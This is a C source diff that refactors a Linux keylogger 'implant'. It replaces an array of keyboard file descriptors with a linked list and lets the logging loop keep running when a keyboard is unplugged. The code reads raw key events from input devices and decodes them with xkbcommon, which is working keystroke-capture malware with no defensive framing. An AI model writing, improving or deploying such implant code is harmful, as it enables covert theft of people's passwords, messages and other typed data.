@@ -10,6 +10,7 @@
 #include <stddef.h>
 #include <string.h>
 #include <errno.h>
+#include <sys/queue.h>
 #include <sys/select.h>
 #include <linux/input.h>
 #include <sys/types.h>
@@ -17,14 +18,14 @@
 #include <xkbcommon/xkbcommon.h>
 
 
-static int get_highest_fd(int *kbfd, int *i) {
-    if (!kbfd)
-        return -1;
+static int get_highest_fd(implant_t *instance) {
+    int highest_fd = -1;
 
-    int highest = -1;
-    for (*i = 0; kbfd[*i] != -1; (*i)++)
-        highest = (highest < kbfd[*i]) ? kbfd[*i] : highest;
-    return highest;
+    keyboard_t *it = NULL;
+    TAILQ_FOREACH(it, &instance->kbd, devices) {
+        highest_fd = (it->fd > highest_fd) ? it->fd : highest_fd;
+    }
+    return highest_fd;
 }
 
 static int log_keyboard(int fd, implant_t *instance, struct xkb_state *state) {
@@ -42,7 +43,7 @@ static int log_keyboard(int fd, implant_t *instance, struct xkb_state *state) {
     }
 
     // 1 = is_pressed
-    if (evt.type == EV_KEY && evt.value == 1) {
+    if (evt.type == EV_KEY && evt.value == KEY_PRESSED) {
         char key_description[256] = {0};
         xkb_keysym_t keysym = xkb_state_key_get_one_sym(state, evt.code + 8);
 
@@ -61,12 +62,11 @@ void keylog(implant_t *instance) {
 
 
     /* first set up select etc */
-    int nb_kb = 0;
-    int highest_fd = get_highest_fd(instance->kb_fd, &nb_kb);
+    int highest_fd = get_highest_fd(instance);
     fd_set rd, err;
     int status = 0;
 
-    if (highest_fd < 0 || !nb_kb) {
+    if (highest_fd < 0) {
         DEBUG_LOG(
             instance->debug_enabled,
             "[!] no keyboard found. exiting"
@@ -122,12 +122,13 @@ void keylog(implant_t *instance) {
 
 
     /* run the damn loop */
-    while (1) {
+    while (1312) {
 
         /* setup FD-sets */
-        for (int i = 0; i < nb_kb; i++) {
-            FD_SET(instance->kb_fd[i], &rd);
-            FD_SET(instance->kb_fd[i], &err);
+        keyboard_t *it = NULL;
+        TAILQ_FOREACH(it, &instance->kbd, devices) {
+            FD_SET(it->fd, &rd);
+            FD_SET(it->fd, &err);
         }
 
         /* check if a key has been pressed */
@@ -143,28 +144,32 @@ void keylog(implant_t *instance) {
         }
 
         /* check file descriptors (first for error, then for new input) */
-        for (int i = 0; i < nb_kb; i++) {
-            if (FD_ISSET(instance->kb_fd[i], &err)) {
+        it = NULL;
+        TAILQ_FOREACH(it, &instance->kbd, devices) {
+            if (FD_ISSET(it->fd, &err)) {
                 DEBUG_LOG(
                     instance->debug_enabled,
                     "[!] Error on file descriptor %d",
-                    instance->kb_fd[i]
+                    it->fd
                 );
 
-                /*
-                    TODO: replace array of keyboard fd by a linked list so
-                    that it can cleanly be removed without breaking the
-                    logger
-                */
+                /* keyboard has been un-plugged, let's continue */
+                close(it->fd);
+                TAILQ_REMOVE(&instance->kbd, it, devices);
 
-                goto LOG_FUNCTION_CLEANUP;
+                /* TODO: there is probably a memory leak here, investigate how to fix */
+
+                continue;
             }
 
             /* checking for new input here */
-            if (FD_ISSET(instance->kb_fd[i], &rd)) {
+            if (FD_ISSET(it->fd, &rd)) {
 
-                /* TODO: should we really kill the run here or can we recover this ? */
-                if (log_keyboard(instance->kb_fd[i], instance, state) == ERROR)
+                /*
+                    should we really kill the run here or can we recover this ?
+                    i need to run some tests before making a decision.
+                */
+                if (log_keyboard(it->fd, instance, state) == ERROR)
                     goto LOG_FUNCTION_CLEANUP;
             }
 
